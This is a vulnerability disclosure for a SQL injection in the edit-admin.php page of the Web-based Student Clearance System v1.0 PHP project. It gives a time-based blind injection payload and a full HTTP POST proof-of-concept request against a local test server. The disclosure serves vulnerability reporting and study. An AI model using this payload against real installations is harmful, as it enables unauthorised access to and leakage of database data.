# Vulnerability Description

[The Web-based Student Clearance System v1.0](https://www.sourcecodester.com/php/15627/web-based-student-clearance-system.html) was discovered to contain a SQL injection vulnerability via the edit-admin.php. It is an open source project from [https://www.sourcecodester.com/](https://www.sourcecodester.com/). This vulnerability can lead to database information leakage.

1. Vulnerability Submitter: Tr0e
  
2. vendors: [Web-Based Student Clearance System in PHP Free Source Code](https://www.sourcecodester.com/php/15627/web-based-student-clearance-system.html);
  
3. The program is built using the xmapp/v3.3.0 and PHP/8.1.10 version;
  
4. Vulnerability location: /student_clearance_system_Aurthur_Javis/admin/edit-admin.php?id=4
  

# Vulnerability Verification

[+] Payload:

```java
4'and(select*from(select+sleep(2))a/**/union/**/select+1)='
```

POC：

```js
POST http://192.168.0.111:91/student_clearance_system_Aurthur_Javis/admin/edit-admin.php?id=4'and(select*from(select+sleep(2))a/**/union/**/select+1)=' HTTP/1.1
Host: 192.168.0.111:91
Content-Length: 467
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.0.111:91
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRRTZDK5qF7Ojo2Pz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.0.111:91/student_clearance_system_Aurthur_Javis/admin/edit-admin.php?id=4
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=rbcvgagjbbad1bbrbb62nukgmc
Connection: close

------WebKitFormBoundaryRRTZDK5qF7Ojo2Pz
Content-Disposition: form-data; name="txtfullname"

EKE, EMMANUEL EFA-EVAL
------WebKitFormBoundaryRRTZDK5qF7Ojo2Pz
Content-Disposition: form-data; name="txtemail"

11112222
------WebKitFormBoundaryRRTZDK5qF7Ojo2Pz
Content-Disposition: form-data; name="cmddesignation"

Admin
------WebKitFormBoundaryRRTZDK5qF7Ojo2Pz
Content-Disposition: form-data; name="btnedit"


------WebKitFormBoundaryRRTZDK5qF7Ojo2Pz--
```

## How to verify

Build the vulnerability environment according to the steps provided by the source code author and execute the poc provided above.

The vulnerability is located at the "User Management - Users Record - Admin Record - Action - Edit" function, you shuold inserts Payload when you edit User Profile，as shown in the following figure：
![image](https://user-images.githubusercontent.com/42080954/194559271-51d6d5ce-fb00-4f18-ab1c-22cdca39cdcc.png)
![image](https://user-images.githubusercontent.com/42080954/194559487-a552942b-d307-4ea5-9c66-60c112d99f8d.png)

